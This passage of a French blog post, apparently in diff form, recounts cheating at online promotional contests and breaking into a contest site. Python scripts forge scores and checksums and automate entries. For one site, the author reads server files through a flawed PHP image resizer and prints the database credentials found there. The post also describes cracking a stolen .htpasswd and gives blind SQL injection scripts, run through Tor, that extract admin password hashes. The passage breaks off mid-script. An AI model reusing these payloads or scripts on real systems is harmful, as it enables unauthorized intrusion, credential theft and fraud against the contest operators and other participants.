+h[&quot;Referer&quot;] = &quot;http://www.trocool.fr/wesh/swf/jeu.swf&quot;
+resp, data = cnx.request(&quot;http://www.trocool.fr/wesh/site/amf/gateway.php&quot;, &quot;POST&quot;, body = s, headers = h)
+
+def convert(c):
+    if c in string.printable:
+        return c
+    else:
+        return &quot; &quot;
+
+result = &quot;&quot;.join(map(convert, data))
+result = re.sub(&quot;\t+&quot;, &quot; &quot;, result)
+result = re.sub(&quot; +&quot;, &quot; &quot;, result)
+print result</pre>
+
+<p><u>Résultat</u></p>
+<p>A cause de tricheurs moins discrets ayant envoyés des scores mathématiquement impossibles, l'organisateur a viré volontairement les meilleurs scores en faisant croire à un problème technique. Comme on a pas eu le temps de se réenregistrer, les lots nous sont passé sous le nez... sympa pour les participants.</p>
+
+<h2>Jeu numéro 5</h2>
+<p>La société <em>BonbonBon</em> organise un jeu qui permet de gagner des paquets de bonbons. Elle a eu recours à la société <em>DesignSuperPro</em> pour créer leur jeu. Cette dernière se présente sur son site Internet comme très pro etc.<br />
+Seulement le jeu est une pauvre animation qui pourrait être codée en javascript et l'envoi du score se fait via un champ caché dans un formulaire html... Triche possible via le navigateur.<br />
+On s'est enregistré avec le meilleur score, on attend toujours les bonbons.<br />
+A mon avis les lots tout comme le jeu, l'organisateur et la société qui a fait le jeu sont une bonne blague.</p>
+
+<h2>Jeu numéro 6</h2>
+<p><u>Présentation</u></p>
+<p>La boîte <em>Rillettes de Brest</em> organise un concours pour pouvoir gagner des rillettes.<br />
+Le jeu est du type &quot;memory&quot;, un autre grand classique des jeux concours.</p>
+
+<p><u>Pwnage</u></p>
+<p>La seule difficulté consiste à comprendre comment son calculés les points. Pour le reste le score est envoyé en clair. L'analyse du swf nous renseigne :</p>
+
+<pre>loc1.score.text = &quot;SCORE : &quot; + (200 + 2 * nbrePaire - nbreCoup);</pre>
+
+<p>Le nombre de paires est fixe : il y a 12 paires. Pour déterminer à quoi correspond la variable <em>nbreCoup</em> on fait une partie à l'arrache en comptant le nombre de fois où on clique.<br />
+On découvre finalement qu'il s'agit exactement du nombre de clics.<br />
+Comme il y a 12 paires, on fait au minimum (un perfect) 24 clics. Le score max est donc 200 + 2 * 12 - 24 = 200. Plus qu'à s'enregistrer avec ce score.</p>
+
+<p><u>Résultat</u></p>
+<p>Comment expliquer que dans le top 10 on trouve que des scores supérieurs à 200 ? Là encore des tricheurs pas très futés. Du coup on sait pas si la société enverra finalement des lots...</p>
+
+<h2>Jeu numéro 7</h2>
+<p><u>Présentation</u></p>
+<p>La société de prêt à porter <em>TopLaClasse </em> organise un jeu concours pour gagner des parfums. Il faut jouer à un jeu style récupération d'un max d'objets dans le temps aloué.</p>
+
+<p><u>Pwnage</u></p>
+<p>L'analyse des communications montre un simple POST avec l'adresse mail et le score mais aussi une variable key qui fait office de checksum.<br />
+On analyse le swf et on trouve le code suivant :</p>
+
+<pre>txt_email.text = _root.game_so.data.emailPlayer;
+var TldEmail:Array = new Array();
+var TK:String = new String();
+var Now = new Date();
+ldEmail = new LoadVars();
+btn_saisie._visible = true;
+btn_save._visible = txt_email._visible = false;
+if (txtReponseEmail != &quot;&quot;)
+{
+    btn_save._visible = txt_email._visible = btn_saisie._visible = false;
+} // end if
+btn_save.onRelease = function ()
+{
+    ldEmail.score = score;
+    ldEmail.key = TK = &quot;&quot;;
+    _root.game_so.data.emailPlayer = email;
+    for (i = 0; i &lt; 5; i++)
+    {
+        TK = TK + ord(email.substr(i, i + 1)).toString();
+    } // end of for
+    var _loc3 = Now.getHours();
+    var _loc2 = Now.getMinutes();
+    if (_loc2.length == 1)
+    {
+        _loc2 = &quot;0&quot; + _loc2;
+    } // end if
+    ldEmail.key = ((Number(TK) + score) * 42 + Number(_loc3 + _loc2)).toString();
+    ldEmail.email = email;
+    ldEmail.sendAndLoad(&quot;http://www.toplaclasse.com/pages/jeu-record.html&quot;, ldEmail, &quot;POST&quot;);
+};</pre>
+
+<p>C'est une simple opération mathématique qui se base sur les représentations décimales des 5 premiers caractères de l'adresse email, le score, ainsi que les heures et les minutes au moment du jeu.<br />
+Ce qui nous donne le code python suivant :</p>
+
+<pre>import time
+import urllib
+import httplib2
+
+email = &quot;hacker@plop.com&quot;
+score = 31337
+
+h = time.localtime().tm_hour
+m = time.localtime().tm_min
+
+s = &quot;&quot;
+for c in email[:5]:
+    s += str(ord(c))
+
+k = int(s) + score
+k *= 42
+
+k += h + m
+print &quot;%d:%d&quot; % (h, m)
+print &quot;key:&quot;, k
+
+d = {'email' : email,
+    'key': str(k),
+    'score' : str(score),
+    'onLoad' : '[type Function]'}
+print urllib.urlencode(d)
+
+head = {&quot;User-Agent&quot; : &quot;Opera/9.80 (Windows NT 5.1; U; fr) Presto/2.9.168 Version/11.52&quot;,
+        'Content-type': 'application/x-www-form-urlencoded'}
+
+cnx = httplib2.Http()
+response, content = cnx.request(&quot;http://www.toplaclasse.com/pages/jeu-position.html&quot;,
+                            'POST', headers=head, body=urllib.urlencode({&quot;score&quot;: str(score)}))
+print content
+
+head[&quot;cookie&quot;] = response[&quot;set-cookie&quot;].split(&quot;;&quot;)[0]
+print head[&quot;cookie&quot;]
+
+response, content = cnx.request(&quot;http://www.toplaclasse.com/pages/jeu-record.html&quot;,
+                            'POST', headers=head, body=urllib.urlencode(d))
+print content</pre>
+
+<p><u>Résultat</u></p>
+<p>On a eu un retour indiquant qu'on faisait partie des gagnants. Reste à voir si on recevra un jour le lot.</p>
+
+<h2>Jeu numéro 8</h2>
+<p><u>Présentation</u></p>
+<p>Les céréales du petit déjeuner <em>Crakobon</em> organisent un concours permettant de gagner différents lots high-tech, principalement des consoles de jeu.<br />
+Le jeu est de type pierre/feuille/ciseaux mais le score final n'est pas pris en compte : si vous perdez une partie vous pouvez rejouer autant de fois que vous le souhaitez jusqu'à la victoire.<br />
+Un nombre maximal de parties gagnées est possible par journée. A la fin d'une période donnée, la somme des parties gagnées est comptabilisée est correspond à un nombre de participation pour un tirage au sort sur cette période.<br />
+Conclusion : pas de triche possible, il suffit juste de créer un bot qui va faire notre nombre max de parties chaque jour. On le placera dans une tâche cron pour qu'il soit lancé.</p>
+
+<p><u>Pwnage</u></p>
+<p>Etant donné le fonctionnement global du challenge, ce dernier n'a pas de mécanismes particuliers de vérification. Il convient juste de se connecter sur le site du jeu, récupérer un cookie de session et envoyer nos &quot;bulletins gagnants&quot; sur le serveur.<br />
+On pourrait faire ça à l'arrache sans se soucier des réponses que nous renvoie le serveur mais on a décidé de bien faire les choses en vérifiant le nombre de parties restantes (dans le cas où le script serait lancé au moment où les compteurs sont remis à zéro) et en créant un journal de log qui historise nos parties jouées.<br />
+<br />
+On a alors le code suivant qui sera rajouté dans la crontab (ou cron.daily) :</p>
+
+<pre># -*- coding: utf-8 -*-
+import httplib2
+import random
+import urllib
+import sys
+import re
+import time
+
+h = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:8.0) Gecko/20100101 Firefox/8.0'}
+
+http = httplib2.Http()
+response, content = http.request(&quot;http://www.crakobon.fr/&quot;, 'GET', headers=h)
+h['Cookie'] = response['set-cookie'].split(&quot;;&quot;)[0]
+print &quot;Got session cookie&quot;, h[&quot;Cookie&quot;]
+
+h[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+
+def httpurl(d):
+  l = []
+  for k, v in d.items():
+    if isinstance(k, unicode):
+      k = k.encode(&quot;utf-8&quot;)
+    if isinstance(v, unicode):
+      v = v.encode(&quot;utf-8&quot;)
+    k = urllib.quote(k)
+    v = urllib.quote(v)
+    l.append(k + &quot;=&quot; + v)
+  return &quot;&amp;&quot;.join(l)
+
+
+def make_req(service, params=None):
+  url = &quot;http://www.crakobon.fr/dispatch.php?%s&amp;service=%s&amp;alea=%s&quot; % (h['Cookie'], service, str(random.randrange(2000,11000)))
+  if service == &quot;init&quot;:
+    method = &quot;GET&quot;
+    response, content = http.request(url, 'GET', headers=h)
+  else:
+    method = &quot;POST&quot;
+    response, content = http.request(url, 'POST', headers=h, body=httpurl(params))
+  return content
+
+make_req(&quot;init&quot;)
+make_req(&quot;tracking&quot;, {&quot;page&quot;: &quot;Start&quot;})
+make_req(&quot;tracking&quot;, {&quot;page&quot;: &quot;Home&quot;})
+buff = make_req(&quot;login&quot;, {'email': 'hacker@plop.com', 'pass': 'p4ssw0rd'}) # doit renvoyer le login et &lt;parties_restant&gt;X&lt;/parties_restant&gt;
+if buff.find(&quot;hacker&quot;) &lt; 0:
+  print &quot;Login error&quot;
+  sys.exit()
+r1 = re.compile('&lt;parties_restant&gt;(.*?)&lt;/parties_restant&gt;')
+nb_parties = int(r1.search(buff).group(1))
+print &quot;Login ok&quot;
+
+if not nb_parties:
+  print &quot;Plus de parties pour aujourd'hui !&quot;
+  sys.exit()
+print nb_parties, &quot;parties a jouer.&quot;
+
+make_req(&quot;user_info&quot;, {&quot;pseudo&quot;: &quot;hacker&quot;})
+
+r2 = re.compile('&lt;id_partie&gt;(.*?)&lt;/id_partie&gt;')
+i = 0
+# On joue nos parties gagnantes
+while nb_parties &gt; 0:
+  make_req(&quot;tracking&quot;, {&quot;page&quot;: &quot;Fight- Round 3&quot;})
+
+  buff = make_req(&quot;debut_partie&quot;, {&quot;type&quot;: &quot;IA&quot;}) # renvoit &lt;id_partie&gt;X&lt;/id_partie&gt;
+  id_partie = r2.search(buff).group(1)
+
+  make_req(&quot;tracking&quot;, {&quot;page&quot;: &quot;Jeu&quot;})
+  buff = make_req(&quot;fin_partie&quot;, {&quot;winner&quot;: &quot;Y&quot;, &quot;id_partie&quot;: id_partie})  # renvoit &lt;parties_restant&gt;X&lt;/parties_restant&gt;
+  nb_parties =  int(r1.search(buff).group(1))
+
+  make_req(&quot;tracking&quot;, {&quot;page&quot;: u&quot;Victory&quot;})
+  i += 1
+
+# On enregistre les resultats
+fd = open(&quot;/tmp/log_crakobon&quot;, &quot;a&quot;)
+fd.write(&quot;%s: %s parties jouees\n&quot; % (time.asctime(), str(i)))
+fd.close()</pre>
+
+<p><u>Résultat</u></p>
+<p>On a reçu un message indiquant qu'on était premier à l'issue de la période... Ensuite il faut s'en remettre à la chance.</p>
+
+<h2>Jeu numéro 9</h2>
+<p><u>Présentation</u></p>
+<p>La marque de boisson <em>Marrée Basse</em> organise un concours pour rajeunir son image. Pour cela elle propose de faire gagner des lots &quot;branchés&quot;.<br />
+Le jeu est du type ramassage d'objets qui tombent. Comme pour le jeu précédent, le score final a une importance très relative. On peut jouer autant de fois que l'on souhaite, seul le meilleur score sera pris en compte.<br />
+A une date prédéfinie, un tirage au sort aura lieu où chaque point compte pour une &quot;voix&quot; dans le tirage. On augmente donc ses chances avec un bon score même si au final la chance a le dernier mot.
+En plus du jeu, un système de parainage permet de récupérer une quantité considérable de points.</p>
+
+<p><u>Pwnage</u></p>
+<p>Inutile de faire les bourrins, premièrement pour ne pas se faire remarquer et deuxièmement à cause du tirage au sort final. On peut tout de même se placer dans le top 10 pour avoir plus de chances.<br />
+Inutile d'analyser le swf, l'analyse réseau nous donne suffisamment d'informations. Le procédé de validation est pour le moins simple : pas de présence de clé de vérification ou d'algo de cryptage.<br />
+Il suffit de récupérer un cookie en spécifiant son username, envoyer son score puis valider le tout en renvoyant les informations complémentaires + un code de type captcha.<br />
+L'opération pourrait se faire via un proxy applicatif comme <em>Charles</em> en activant l'interception des données pour modification mais on a préféré écrire un code qui télécharge l'image captcha, l'affiche (sous windows) et nous demande de taper le code dans la console avant de renvoyer les données.</p>
+
+<pre>import time
+import urllib
+import httplib2
+import random
+import sys
+import os
+
+score = 6957
+user = 1363
+
+head = {&quot;User-Agent&quot; : &quot;Mozilla/5.0 (Windows NT 6.1; rv:9.0) Gecko/20100101 Firefox/9.0&quot;,
+        'Content-type': 'application/x-www-form-urlencoded'}
+
+cnx = httplib2.Http()
+
+# Ouverture de la session
+response, content = cnx.request(&quot;http://www.marreebasse.com/scripts/submit.php&quot;,
+                            'POST', headers = head, body = &quot;user_id=%d&quot; % (user))
+
+cookie = response[&quot;set-cookie&quot;].split(&quot;;&quot;)[0]
+head[&quot;Cookie&quot;] = cookie
+print cookie
+
+# Envoi du score
+response, content = cnx.request(&quot;http://www.marreebasse.com/scripts/submit.php&quot;,
+                            'POST', headers = head, body = &quot;score=%d&quot; % (score))
+
+# Lecture captcha
+response, content = cnx.request(&quot;http://www.marreebasse.com/scripts/captcha.php&quot;,
+                            'GET', headers = head)
+fd = open(&quot;captcha.jpg&quot;, &quot;wb&quot;)
+fd.write(content)
+fd.close()
+
+os.startfile(&quot;captcha.jpg&quot;)
+captcha = raw_input(&quot;Code: &quot;).strip()
+
+d = {'captcha' : captcha,
+     'email' : 'hacker@plop.com',
+     'score' : score,
+     'pseudo' : 'hacker',
+     'lastname' : 'HACKER',
+     'firstname' : 'Leet'}
+
+# Conformation score + captcha
+response, content = cnx.request(&quot;http://www.marreebasse.com/scripts/valider.php&quot;,
+                            'POST', headers = head, body = urllib.urlencode(d))
+
+print content</pre>
+
+<p><u>Résultat</u></p>
+<p>Aucun problème pour se placer dans la tête. Pour le reste il faut croiser les doigts.</p>
+
+<h2>Jeu numéro 10</h2>
+<p><u>Présentation</u></p>
+<p><em>Rikantonai</em> (filiale de <em>Microndable</em>) organise un concours pour faire connaître ses nouveaux produits sur le marché. Pour cela elle a mis en place un jeu Flash de type ramassage d'objets dans lequel il faut récupérer le plus d'objets dans un temps donné.</p>
+
+<p><u>Pwnage</u></p>
+<p>On peut bien sûr analyser le flash qui nous apprendra que le process de validation (via une variable clé) se fait par l'utilisation de md5 et ainsi soumettre les scores que l'on souhaite.<br />
+Mais l'entreprise a trouvé une bonne façon de promouvoir ses produits : sur les produits de la marque on peut trouver des codes à soumettre sur le site qui augmentent la durée des parties et donc permettent d'obtenir un meilleur score.<br />
+On se rend en magasin et on zieute voir si le code est visible sur l'extérieur du produit mais ce n'est pas le cas. Du coup on achète quelques produits histoire de voir ce qu'il se passe lors de la soumission d'un code et si c'est possible de tricher.</p>
+
+<p>Comme vous vous en doutez, on ne trouve rien du tout d'intéressant... Et on se dit que se serait bien de récupérer les PHP côté serveur histoire de voir comment ça fonctionne (puisqu'on est curieux).<br />
+Pour éviter de faire des bétises on commence par bloquer toutes les communications avec le site sur notre machine (iptables -A OUTPUT -d <em>ip_du_serveur</em> -j DROP) puis on lance un Tor/Privoxy/Firefox et on commence à chercher des failles sur le site web.<br />
+On relève les URLs et formulaires avec des paramêtres puis on teste les failles SQL, local include &amp; co. On trouve finalement un script PHP vulnérable dont le rôle est de redimensionner une image.<br />
+Dans la théorie un tel script ne devrait pas être faillible mais son auteur fait pourtant appel à la fonction readfile() à des fins de débug...<br />
+Soit le mec est très con, soit il a volontairement inclus une backdoor. Je vous laisse juger par vous même :</p>
+
+<pre>&lt;?php
+header (&quot;Content-type: image/jpeg&quot;);
+/*
+JPEG / PNG Image Resizer
+Parameters (passed via URL):
+
+img = path / url of jpeg or png image file
+
+percent = if this is defined, image is resized by it's
+          value in percent (i.e. 50 to divide by 50 percent)
+
+w = image width
+
+h = image height
+
+constrain = if this is parameter is passed and w and h are set
+            to a size value then the size of the resulting image
+            is constrained by whichever dimension is smaller
+
+Requires the PHP GD Extension
+
+Outputs the resulting image in JPEG Format
+
+By: Michael John G. Lopez - www.sydel.net
+Filename : imgsize.php
+*/
+
+$img = $_GET['img'];
+//$percent = $_GET['percent'];
+//$constrain = $_GET['constrain'];
+$w = $_GET['w'];
+$h = $_GET['h'];
+
+// get image size of img
+$x = @getimagesize($img);
+// image width
+$sw = $x[0];
+// image height
+$sh = $x[1];
+
+if (isset ($w) AND !isset ($h)) {
+        // autocompute height if only width is set
+        $h = (100 / ($sw / $w)) * .01;
+        $h = @round ($sh * $h);
+} elseif (isset ($h) AND !isset ($w)) {
+        // autocompute width if only height is set
+        $w = (100 / ($sh / $h)) * .01;
+        $w = @round ($sw * $w);
+} elseif (isset ($h) AND isset ($w) AND isset ($constrain)) {
+        // get the smaller resulting image dimension if both height
+        // and width are set and $constrain is also set
+        $hx = (100 / ($sw / $w)) * .01;
+        $hx = @round ($sh * $hx);
+
+        $wx = (100 / ($sh / $h)) * .01;
+        $wx = @round ($sw * $wx);
+
+        if ($hx &lt; $h) {
+                $h = (100 / ($sw / $w)) * .01;
+                $h = @round ($sh * $h);
+        } else {
+                $w = (100 / ($sh / $h)) * .01;
+                $w = @round ($sw * $w);
+        }
+}
+
+
+$im = @ImageCreateFromJPEG ($img) or // Read JPEG Image
+$im = @ImageCreateFromPNG ($img) or // or PNG Image
+$im = @ImageCreateFromGIF ($img) or // or GIF Image
+$im = false; // If image is not JPEG, PNG, or GIF
+
+if (!$im) {
+        // We get errors from PHP's ImageCreate functions...
+        // So let's echo back the contents of the actual image.
+        readfile ($img);
+} else {
+        // Create the resized image destination
+        $thumb = @ImageCreateTrueColor ($w, $h);
+        // Copy from image source, resize it, and paste to image destination
+        @ImageCopyResampled ($thumb, $im, 0, 0, 0, 0, $w, $h, $sw, $sh);
+        // Output resized image
+        @ImageJPEG ($thumb ,NULL, 200);
+}
+?&gt;</pre>
+
+<p>Le site du jeu se base sur le framework AMF-PHP. Comme on y connait trop rien on fouille un peu sur Google pour comprendre comment ça se configure et où se trouvent les fichiers sensibles.<br />
+Au moment du jeu (qui remonte à loin, inutile d'essayer de le retrouver), il n'existait pas de tools comme <em>AMFshell</em> (<a href="http://d4n3ws.polux-hosting.com/2011/05/02/amfshell/">cité sur d4n3wS</a>) pour nous faciliter le travail.<br />
+On a tout de même trouvé les références suivantes :</p>
+
+<ul>
+  <li><a href="http://tournasdimitrios1.wordpress.com/2010/07/17/basics-to securing amfphp/">Basics to securing AMFPHP</a></li>
+  <li><a href="http://www.ekameleon.net/blog/index.php?post/2011/01/03/AMF-services-with-the-VEGAS-framework">AMF services with the VEGAS framework</a></li>
+  <li><a href="http://www.astorm.ch/blog/index.php?post/2008/03/16/Faire-du-remoting-AS3">Faire du remoting en AS3</a></li>
+</ul>
+
+<p>On en déduit que les scripts qui nous intéressent se situent dans le path <em>/amfphp/services/</em> (c'est la valeur par défaut et c'est défini dans <em>globals.php</em> (appelé par le script principal <em>gateway.php</em>).<br />
+AMF est une technologie d'Adobe. Toutes les libs sont déjà présentes dans le plugin Flash côté client et le framework AMF-PHP côté serveur. L'appel aux &quot;services&quot; est donc quelque chose d'asez transparent aux yeux des développeurs.</p>
+<p>Voici ce qu'on trouvait dans le code ActionScript décompilé :</p>
+<pre>private var _codeService:NetConnection;
+private var _codeResponder:Responder;
+private var _hiScoreService:NetConnection;
+private var _hiScoreResponder:Responder;
+
+public function Communications(param1:IEventDispatcher = null)
+{
+    this._codeResponder = new Responder(this._onCodeSuccess, this._onCodeFault);
+    this._hiScoreResponder = new Responder(this._onHiScoreSuccess, this._onHiScoreFault);
+    this._codeService = new NetConnection();
+    this._codeService.objectEncoding = ObjectEncoding.AMF3;
+    this._codeService.addEventListener(IOErrorEvent.IO_ERROR, this._onCodeIOError);
+    this._codeService.connect(&quot;http://www.rikantonai.com/amfphp/gateway.php&quot;);
+    this._hiScoreService = new NetConnection();
+    this._hiScoreService.objectEncoding = ObjectEncoding.AMF3;
+    this._hiScoreService.addEventListener(IOErrorEvent.IO_ERROR, this._onHiScoreIOError);
+    this._hiScoreService.connect(&quot;http://www.rikantonai.com/amfphp/gateway.php&quot;);
+    super(param1);
+    return;
+}
+
+public function checkCode(param1:String, param2:String, param3:String) : void
+{
+    trace(&quot;Communications::Check Code Validity&quot;);
+    trace(&quot;userID   : &quot; + param1);
+    trace(&quot;sessionID: &quot; + param2);
+    trace(&quot;codeInput: &quot; + param3);
+    trace(&quot;encrypt  : &quot; + MD5.hash(param2));
+    trace(&quot;\n\n&quot;);
+    this._codeService.call(&quot;code.check&quot;, this._codeResponder, param1, param2, param3, MD5.hash(param2));
+    return;
+}
+
+public function uploadScore(param1:String, param2:String, param3:Number) : void
+{
+    trace(&quot;Communications::Upload High Score&quot;);
+    trace(&quot;userID   : &quot; + param1);
+    trace(&quot;sessionID: &quot; + param2);
+    trace(&quot;hiScore  : &quot; + param3);
+    trace(&quot;encrypt  : &quot; + MD5.hash(param2));
+    this._hiScoreService.call(&quot;submit.save&quot;, this._hiScoreResponder, param1, param2, param3, MD5.hash(param2));
+    return;
+}</pre>
+
+<p>La façon dont il faut interpréter une instruction comme <em>this._codeService.call(&quot;code.check&quot;, ...)</em> signifie en fait qu'on appelle la fonction <em>check()</em> qui se situe dans le script <em>code.php</em> dans le dossier /amfphp/services/.<br />
+On utilise alors le readfile() pour obtenir code.php (qui sert à enregistrer les codes de temps) :</p>
+
+<pre>&lt;?
+class code
+{
+
+  public function __construct()
+  {
+    mysql_connect(&quot;localhost&quot;, &quot;spip&quot;, &quot;sUp3rl33tp4s5!&quot;);
+    mysql_select_db(&quot;spip_bd&quot;);
+  }
+
+  function check($userID, $sessionID, $code, $encrypted)
+  {
+    // verifie les identifiants
+    if ($this-&gt;_docheckuser($userID, $sessionID) == false)
+    {
+      // FAIL !
+      $response[&quot;success&quot;] = false;
+      $response[&quot;codeValue&quot;] = '0';
+      return $response;
+    }
+
+    // Verification de la cle
+    $data_encrypted = md5($sessionID);
+
+    if ($data_encrypted != $encrypted) {
+      $response[&quot;success&quot;] = false;
+      $response[&quot;codeValue&quot;] = '0';
+      return $response;
+    }
+
+    // Verifie le code promotionnel (deja utilise?)
+    $sqluser = 'SELECT tps,id_auteur FROM code WHERE code = &quot;'.$code.'&quot;';
+    $requser = mysql_query($sqluser) or die('Erreur SQL !&lt;br /&gt;'.$sqluser.'&lt;br /&gt;'.mysql_error());
+    $responseuser = mysql_fetch_array($requser);
+    if ($responseuser[1] != '0' &amp;&amp; $responseuser[1] != '' ) {
+      $response[&quot;success&quot;] = false;
+      $response[&quot;codeValue&quot;] = '0';
+      return $response;
+    }else {
+      if ($responseuser[0] == '' ){
+        $response[&quot;success&quot;] = false;
+        $response[&quot;codeValue&quot;] = '0';
+        return $response;
+      } else {
+        $sqluser = &quot;UPDATE code SET id_auteur='&quot;.$userID.&quot;' ,date_used = NOW() WHERE code='&quot;.$code.&quot;'&quot;;
+        $requser = mysql_query($sqluser) or die('Erreur SQL !&lt;br /&gt;'.$sqluser.'&lt;br /&gt;'.mysql_error());
+        $response[&quot;success&quot;] = true;
+        $response[&quot;codeValue&quot;] = $responseuser[0];
+        return $response;
+      }
+    }
+  }
+
+  function _docheckuser($userID,$sessionID)
+  {
+    $sql = 'SELECT count(*) FROM spip_auteurs WHERE id_auteur=&quot;'.$userID.'&quot;AND alea_futur=&quot;'.$sessionID.'&quot;';
+    $req = mysql_query($sql) or die('Erreur SQL !&lt;br /&gt;'.$sql.'&lt;br /&gt;'.mysql_error());
+    $data = mysql_fetch_array($req);
+    if ($data[0] == '0' ){
+      return false;
+    }else {
+      return true ;
+    }
+  }
+}
+?&gt;</pre>
+
+<p>et on fait de même avec <em>submit.php</em> (qui permet l'enregistrement des codes)</p>
+
+<pre>&lt;?
+class submit
+{
+
+  public function __construct()
+  {
+    mysql_connect(&quot;localhost&quot;, &quot;spip&quot;, &quot;sUp3rl33tp4s5&quot;);
+    mysql_select_db(&quot;spip_bd&quot;);
+  }
+
+  function save($userID, $sessionID,$score,$encrypted)
+  {
+    if ($this-&gt;_docheckuser($userID,$sessionID) == false)
+    {
+      return 'User invalid';
+    }
+
+    $data_encrypted = md5($sessionID);
+
+    if ($data_encrypted != $encrypted) return 'encryption error';
+
+    // UPDATE ou INSERT ? User a t-il deja joue ?
+    $sql2 = 'SELECT score FROM user_rktn WHERE id_auteur='.$userID.'';
+    $req2 = mysql_query($sql2) or die('Erreur SQL !&lt;br /&gt;'.$sql2.'&lt;br /&gt;'.mysql_error());
+    $data2 = mysql_fetch_array($req2);
+
+    if ($data2[0] != '') {
+      // update
+      $sqluser = &quot;UPDATE user_rktn SET score='&quot;.$score.&quot;'and updated = NOW() WHERE id_auteur='&quot;.$userID.&quot;'&quot;;}
+    else {
+      $sqluser = &quot;INSERT INTO user_rktn (id, id_auteur, score, updated) VALUES ('','&quot;.$userID.&quot;','&quot;.$score.&quot;',NOW())&quot;;
+    }
+    $requser = mysql_query($sqluser) or die('Erreur SQL !&lt;br /&gt;'.$sqluser.'&lt;br /&gt;'.mysql_error());
+
+    return 'ok';
+  }
+
+  function _docheckuser($userID,$sessionID)
+  {
+    $sql = 'SELECT count(*) FROM spip_auteurs WHERE id_auteur=&quot;'.$userID.'&quot;AND alea_futur=&quot;'.$sessionID.'&quot;';
+    $req = mysql_query($sql) or die('Erreur SQL !&lt;br /&gt;'.$sql.'&lt;br /&gt;'.mysql_error());
+    $data = mysql_fetch_array($req);
+    if ($data[0] == '0' ){
+      return false;
+    }else {
+      return true ;
+    }
+  }
+}
+?&gt;</pre>
+
+<p>Avantage LOTFREE ! :) On a obtenu des identifiants de base de données ainsi que les noms de trois tables : <em>code</em>, <em>spip_auteurs</em> et <em>user_rktn</em>.<br />
+Malheureusement la base de données est inaccessible depuis l'extérieur :'( Mais j'avoue qu'on a pas essayé de jouer avec le firewall.</p>
+
+<p>Du coup on a exploité les jolies failles SQL présentes dans les scripts puisque les chaines de requêtes SQL ne sont à aucun moment vérifiées :)<br />
+Définir notre score ne nous intéresse pas comme on l'a déjà vu. En revanche obtenir des codes de temps valide c'est tout bénef puisque la société n'a pas moyen de vérifier si les produits sont effectivement achetés.<br />
+Mais on s'est retrouvé face à un problème qui semble insolvable : les codes temps que l'on récupérera, il faudra les utiliser avec notre account.<br />
+Or si l'admin regarde ses logs SQL il verra les requêtes ayant permis d'extraire les codes et serait capable de retrouver quel compte les a utilisé.<br />
+Nos premiers essais ont consisté à utiliser <em>into outfile</em> mais les droits du daemon n'étaient pas suffisant. On peut se baser sur des fonctions dont le résultat n'est pas fixe comme NOW() et faire des calculs (style WHERE ID = minutes de l'heure en cours * 10 + 4) pour embrouiller l'admin mais si les requêtes sont datées dans les logs il parviendra quand même à remonter notre processus d'extraction.</p>
+
+<p>On a décidé de fouiller plus en direction du CMS SPIP dont on a vu précédemment l'utilisation puisque les comptes sont enregistrés dans la base spip_auteurs.<br />
+SPIP a une interface admin accessible depuis /ecrire. Si on tente d'y accèder on se retrouve devant une authentification HTTP.<br />
+<br />
+Grace au readfile on récupère le .htacess qui bloque :</p>
+
+<pre>AuthUserFile /var/www/vhosts/rikantonai.com/httpdocs/ecrire/.htpasswd
+AuthName &quot;-- Rikantonai private area !--&quot;
+AuthType Basic
+&lt;Limit GET POST&gt;
+require valid-user
+&lt;/Limit&gt;</pre>
+
+<p>puis le fichier .htpasswd correspondant. Avec un dictionnaire et John The Ripper il n'aura fallu que quelques secondes pour récupérer le password en clair :)</p>
+
+<p>Maintenant il nous faut récupérer les identifiants admin de SPIP depuis la base de données. Comme ici on a pas besoin de passer notre ID dans les requêtes SQL on y va avec allegresse (mais pas sans rustines, bitches) :p<br />
+Les users admin sous spip ont dans la base de données un champ statut défini à &quot;0minirezo&quot;.<br />
+Pour extraire les données on va utiliser le script submit.php et en particulier la vérification des identifiants pour retrouver par dichotomie logins et passwords. C'est de la vrai-fausse SQL injection dans le sens où on a accès au code source mais on se base sur un résultat booleen (soit vrai soit faux).</p>
+
+<p>On part de la requête suivante :</p>
+
+<pre>$sql = 'SELECT count(*) FROM spip_auteurs WHERE id_auteur=&quot;'.$userID.'&quot;AND alea_futur=&quot;'.$sessionID.'&quot;';</pre>
+
+<p>On défini $userID à ce que l'on souhaite (pas d'importance) puis $sessionID à, par exemple, <em>&quot; OR length(login)=5 AND statut!=&quot;0minirezo</em> ce qui nous donne :</p>
+
+<pre>SELECT count(*) FROM spip_auteurs WHERE id_auteur=&quot;0&quot; AND alea_futur=&quot;&quot; OR length(login)=5 AND statut!=&quot;0minirezo</pre>
+
+<p>Si un admin existe avec un username de longueur 5 on a un retour positif à la sortie de <em>_docheckuser</em> et ça échoue dans <em>save()</em> en retournant 'encryption error'.<br />
+Si un tel utilisateur n'existe pas le script termine avant.</p>
+
+<p>Pour automatiser nos attaques on va utiliser la librairie <a href="http://www.pyamf.org/">pyamf</a>. Ce qui nous donne ce code d'exemple maison en Python (le hacking c'est de l'artisanat) :</p>
+
+<pre>import os
+from pyamf.remoting.client import RemotingService
+os.environ['HTTP_PROXY'] = '127.0.0.1:8123' # Proxy Tor
+gateway = RemotingService(&quot;http://www.rikantonai.com/amfphp/gateway.php&quot;)
+submit_service = gateway.getService('submit.save')
+# userId, sessionID, score, hash
+print submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND length(pass)=0 AND statut!=&quot;0minirezo', '', 404, 'xxx')</pre>
+
+<p>Et si on fait un bruteforce pour obtenir le hash du login test (sachant que la longueur des hashs est de 32 caractères) :</p>
+
+<pre>import os
+from pyamf.remoting.client import RemotingService
+
+os.environ['HTTP_PROXY'] = '127.0.0.1:8123'
+
+gateway = RemotingService(&quot;http://www.rikantonai.com/amfphp/gateway.php&quot;)
+submit_service = gateway.getService('submit.save')
+# userId, sessionID, score, hash
+hash = &quot;&quot;
+for i in range(1,33):
+  pos = str(i)
+  c = ''
+
+  if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;96 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+    # caractere
+    if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))&gt;100 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
+      # e ou f
+      if submit_service(&quot;0&quot;, '&quot; OR login=&quot;test&quot; AND ascii(substr(pass,%s,1))=101 AND statut!=&quot;0minirezo' % (pos), '', 404, 'xxx') == &quot;encryption error&quot;:
